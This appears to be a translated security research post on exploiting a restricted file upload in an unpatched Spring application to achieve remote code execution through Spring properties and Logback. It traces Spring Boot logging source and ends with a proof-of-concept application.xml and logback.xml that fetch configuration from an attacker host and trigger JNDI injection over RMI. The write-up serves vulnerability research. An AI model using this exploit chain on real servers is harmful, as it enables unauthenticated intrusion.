#  Spring Properties 远程代码执行   
srcincite  securitainment   2024-12-07 15:54  
  
> Remote Code Execution with Spring Properties   
  
# Spring Properties 远程代码执行  
  
最近，一位以前的学生向我展示了一个非常有趣的 Spring 应用程序中的未经身份验证的漏洞，他们在利用这个漏洞时遇到了困难。上周末我抽时间研究了这个问题，并找到了一个相对简洁的解决方案，尽管我更希望能找到一个更通用的方案来利用这个向量攻击 Spring 应用程序。让我们一起深入了解一下，好吗？  
## 漏洞详情  
  
由于这不是我发现的漏洞，而且目前还未修复，我只能分享一段模拟代码，但漏洞看起来是这样的：  
```

/*  152 */             MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
/*  153 */             MultipartFile multipart = multipartRequest.getFile("file");
/*  154 */             String fileName = multipart.getOriginalFilename(); // 1
/*  155 */             String fileExtension = FilenameUtils.getExtension(fileName); // 2
/*  156 */             if (!supportContentType(fileExtension)) { // 3
/*  157 */               throw new Exception("blah");
/*      */             }
/*  159 */             File file = new File(fileName);
/*  160 */             multipart.transferTo(file); // 4
```  
  
supportContentType  
 调用会检查文件名是否包含以下扩展名之一：  
```

/* 95 */ public static List<String> fexts = Arrays.asList(new String[] { "gif", "jpeg", "jpg", "png", "swf", "bmp", "asf", "avi", "mpeg", "mpg", "ts", "trp", "m2v", "m2p", "mp4", "m1v", "m4v", "m4t", "vob", "m2t", "tsp", "mov", "asx", "wmv", "tp", "doc", "docx", "ppt", "pptx", "xls", "xlsx", "htm", "html", "pps", "ppsx", "pdf", "mp3", "ogg", "wav", "wma", "mp2", "ac3", "pcm", "lpcm", "flv", "wmf", "emf", "tif", "tiff", "mid", "mkv", "ra", "rm", "ram", "rmvb", "3gp", "svi", "m2ts", "divx", "mts", "vro", "zip", "xml", "wgt", "aisr" });
```  
  
如果扩展名不在[3]处的允许列表中，代码将抛出异常。但是，如果扩展名在允许列表中，那么代码将继续在[4]处写入上传的文件。在[1]处代码仅获取文件名，所以我们不能在这里使用目录遍历。此外，没有给定路径，这意味着默认情况下，服务将写入 tomcat 服务器的基本目录：C:\[redacted]\tomcat\bin  
。  
## 利用方法  
  
受到一位  
好朋友  
的启发，他利用了一个受限的文件写入漏洞实现了未经身份验证的远程代码执行，我准备深入研究。由于我从未真正利用过与文件上传相关的如此严格的限制，我很好奇该如何处理这类漏洞。表面上看，这似乎无法利用，因为我们只有有限的文件写入权限。我们无法控制写入位置，而且我们有一个看似不太有趣的扩展名允许列表...或者说它们真的不有趣吗？  
  
对我来说，最引人注目的两个扩展名是.zip  
和.xml  
。Tomcat 非常喜欢处理xml  
文件，让我们先试试这个。在研究了一会儿tomcat9.exe  
进程后，我注意到它试图加载一个不存在的文件：application.xml  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOtcNpw1avDbmxm15Cl6LtEYJkibdF9Po4fP6N5DrASGMh75LZ6astBJeMZDuVXeFZSl6XuqMOypeQ/640?wx_fmt=png&from=appmsg "寻找application.xml")  
  
当我在目录中放置一个无效的xml  
文件时，我看到了一个堆栈跟踪，显示它正在使用ConfigFileApplicationListener  
类加载该文件。根据这篇  
博客文章  
,监听器会按以下顺序尝试从以下扩展名加载应用程序配置文件：  
- properties  
  
- xml  
  
- yml  
  
- yaml  
  
这与我在 Process Monitor 中看到的完全匹配。有趣的是，xml  
扩展名几乎没有文档记载，但快速搜索 Google 会找到官方 Spring  
通用应用程序属性  
文档。有几个属性，但很快引起我注意的是logging.config  
。这个属性由org.springframework.boot.context.logging.LoggingApplicationListener  
类使用。研究这个类，我们发现以下代码：  
```

/*     */   public void onApplicationEvent(ApplicationEvent event) {
/* 219 */     if (event instanceof ApplicationStartingEvent) {
/* 220 */       onApplicationStartingEvent((ApplicationStartingEvent)event);
/*     */     }
/* 222 */     else if (event instanceof ApplicationEnvironmentPreparedEvent) {
/* 223 */       onApplicationEnvironmentPreparedEvent((ApplicationEnvironmentPreparedEvent)event); // 1
/*     */     }
/* 225 */     else if (event instanceof ApplicationPreparedEvent) {
/* 226 */       onApplicationPreparedEvent((ApplicationPreparedEvent)event);
/*     */     }
/* 228 */     else if (event instanceof ContextClosedEvent && ((ContextClosedEvent)event)
/* 229 */       .getApplicationContext().getParent() == null) {
/* 230 */       onContextClosedEvent();
/*     */     }
/* 232 */     else if (event instanceof org.springframework.boot.context.event.ApplicationFailedEvent) {
/* 233 */       onApplicationFailedEvent();
/*     */     }
/*     */   }
```  
  
At [1] the onApplicationEvent  
 calls the onApplicationEnvironmentPreparedEvent  
 method:  
```

/*     */   private void onApplicationEnvironmentPreparedEvent(ApplicationEnvironmentPreparedEvent event) {
/* 243 */     if (this.loggingSystem == null) {
/* 244 */       this.loggingSystem = LoggingSystem.get(event.getSpringApplication().getClassLoader());
/*     */     }
/* 246 */     initialize(event.getEnvironment(),  event.getSpringApplication().getClassLoader()); // 2
/*     */   }
```  
  
At [2] the initialize  
 method is called with the environment as the first argument:  
```

/*     */   protected void initialize(ConfigurableEnvironment environment, ClassLoader classLoader) {
/* 281 */     (new LoggingSystemProperties(environment)).apply();
/* 282 */     this.logFile = LogFile.get(environment);
/* 283 */     if (this.logFile != null) {
/* 284 */       this.logFile.applyToSystemProperties();
/*     */     }
/* 286 */     this.loggerGroups = new LoggerGroups(DEFAULT_GROUP_LOGGERS);
/* 287 */     initializeEarlyLoggingLevel(environment);
/* 288 */     initializeSystem(environment, this.loggingSystem, this.logFile); // 3
/* 289 */     initializeFinalLoggingLevels(environment, this.loggingSystem);
/* 290 */     registerShutdownHookIfNecessary(environment, this.loggingSystem);
/*     */   }
```  
  
在[3]处调用了initializeSystem  
方法并传入了 environment 参数。请记住，通过当前的漏洞，我们可以在 environment 中设置属性。这使我们能够通过logging.config  
属性来控制日志配置。  
```

/*     */   private void initializeSystem(ConfigurableEnvironment environment, LoggingSystem system, LogFile logFile) {
/* 310 */     LoggingInitializationContext initializationContext = new LoggingInitializationContext(environment);
/* 311 */     String logConfig = environment.getProperty("logging.config"); // 4
/* 312 */     if (ignoreLogConfig(logConfig)) {
/* 313 */       system.initialize(initializationContext, null, logFile);
/*     */     } else {
/*     */
/*     */       try {
/* 317 */         ResourceUtils.getURL(logConfig).openStream().close();
/* 318 */         system.initialize(initializationContext, logConfig, logFile); // 5
/*     */       }
/* 320 */       catch (Exception ex) {
/*     */
/* 322 */         System.err.println("Logging system failed to initialize using configuration from '" + logConfig + "'");
/* 323 */         ex.printStackTrace(System.err);
/* 324 */         throw new IllegalStateException(ex);
/*     */       }
/*     */     }
/*     */   }
```  
  
在[4]处，代码会从环境中获取logging.config  
属性，并在[5]处将其解析后传递给org.springframework.boot.logging.logback.LogbackLoggingSystem  
类的initialize  
方法。  
```

/*     */   public void initialize(LoggingInitializationContext initializationContext, String configLocation, LogFile logFile) {
/* 109 */     LoggerContext loggerContext = getLoggerContext();
/* 110 */     if (isAlreadyInitialized(loggerContext)) {
/*     */       return;
/*     */     }
/* 113 */     super.initialize(initializationContext, configLocation, logFile); // 6
/* 114 */     loggerContext.getTurboFilterList().remove(FILTER);
/* 115 */     markAsInitialized(loggerContext);
/* 116 */     if (StringUtils.hasText(System.getProperty("logback.configurationFile"))) {
/* 117 */       getLogger(LogbackLoggingSystem.class.getName()).warn("Ignoring 'logback.configurationFile' system property. Please use 'logging.config' instead.");
/*     */     }
/*     */   }
```  
  
在[6]处，代码将使用攻击者可控的属性调用super.initialize  
。这个调用将流向父类：org.springframework.boot.logging.AbstractLoggingSystem  
：  
```

/*     */   public void initialize(LoggingInitializationContext initializationContext, String configLocation, LogFile logFile) {
/*  55 */     if (StringUtils.hasLength(configLocation)) {
/*  56 */       initializeWithSpecificConfig(initializationContext, configLocation, logFile); // 7
/*     */       return;
/*     */     }
/*  59 */     initializeWithConventions(initializationContext, logFile);
/*     */   }

/*     */   private void initializeWithSpecificConfig(LoggingInitializationContext initializationContext, String configLocation, LogFile logFile) {
/*  64 */     configLocation = SystemPropertyUtils.resolvePlaceholders(configLocation);
/*  65 */     loadConfiguration(initializationContext, configLocation, logFile); // 8
/*     */   }
```  
  
在[7]处，程序流程继续到initializeWithSpecificConfig  
，然后在[8]处到达loadConfiguration  
。由于loadConfiguration  
在父类中没有定义，因此流程会回到子类org.springframework.boot.logging.logback.LogbackLoggingSystem  
中：  
```

/*     */   protected void loadConfiguration(LoggingInitializationContext initializationContext, String location, LogFile logFile) {
/* 136 */     super.loadConfiguration(initializationContext, location, logFile);
/* 137 */     LoggerContext loggerContext = getLoggerContext();
/* 138 */     stopAndReset(loggerContext);
/*     */     try {
/* 140 */       configureByResourceUrl(initializationContext, loggerContext, ResourceUtils.getURL(location)); // 9
/*     */     }
/* 142 */     catch (Exception ex) {
/* 143 */       throw new IllegalStateException("Could not initialize Logback logging from " + location, ex);
/*     */     }
/* 145 */     List<Status> statuses = loggerContext.getStatusManager().getCopyOfStatusList();
/* 146 */     StringBuilder errors = new StringBuilder();
/* 147 */     for (Status status : statuses) {
/* 148 */       if (status.getLevel() == 2) {
/* 149 */         errors.append((errors.length() > 0) ? String.format("%n", new Object[0]) : "");
/* 150 */         errors.append(status.toString());
/*     */       }
/*     */     }
/* 153 */     if (errors.length() > 0) {
/* 154 */       throw new IllegalStateException(String.format("Logback configuration error detected: %n%s", new Object[] { errors }));
/*     */     }
/*     */   }
/*     */
/*     */
/*     */   private void configureByResourceUrl(LoggingInitializationContext initializationContext, LoggerContext loggerContext, URL url) throws JoranException {
/* 160 */     if (url.toString().endsWith("xml")) {
/* 161 */       JoranConfigurator configurator = new SpringBootJoranConfigurator(initializationContext);
/* 162 */       configurator.setContext(loggerContext);
/* 163 */       configurator.doConfigure(url); // 10
/*     */     } else {
/*     */
/* 166 */       (new ContextInitializer(loggerContext)).configureByResource(url);
/*     */     }
/*     */   }
```  
  
跟踪由攻击者控制的location  
参数的流程，我们可以看到在[9]处它被转换为URL  
后到达configureByResourceUrl  
方法。最后在[10]处，我们可以看到著名的JoranConfigurator  
被初始化，并最终调用了doConfigure  
方法。  
  
参加过我的课程的人可能都知道接下来会发生什么。我们可以使用logback.xml  
 URL 来重新配置 log-back 库。最终的概念验证application.xml  
文件内容如下：  
```

<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
    <entry key="logging.config">http://[attacker]:[port]/logback.xml</entry>
</properties>
```  
  
对应的 log-back 文件内容对某些人来说可能比较熟悉：  
```

<configuration>
  <insertFromJNDI env-entry-name="rmi://[attacker]:1099/Object" as="appName" />
</configuration>
```  
  
在这里，天时地利人和都已具备，我们找到了一种方法可以通过暴露的 REST API 远程重启服务器，当然ELProcessor  
也包含在类路径中。结果如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOtcNpw1avDbmxm15Cl6LtEVTfZmpmQysYlibtujYSz58soOmIwxYycgaT9YWNqhZRguDXiczuL0GmA/640?wx_fmt=png&from=appmsg "通过滥用Spring属性实现JNDI注入获取RCE")  
## 总结思考  
  
这里可能还有许多其他获得远程代码执行的方法，比如定义日志文件路径和其他攻击向量。我没有太多时间深入研究这个问题，就采用了第一个可行的方法。我鼓励其他研究人员深入研究 Spring 框架，寻找使用环境属性的其他监听器，发现更多的利用向量！还有其他使用 log-back 进行代码注入的方式，比如 JDBC（课堂上讲授的）以及直接（滥用）反序列化器。不过这就留给读者去研究了。  
## 参考文献  
- https://juejin.cn/post/6972564484720328718  
  
##   
  
  
  
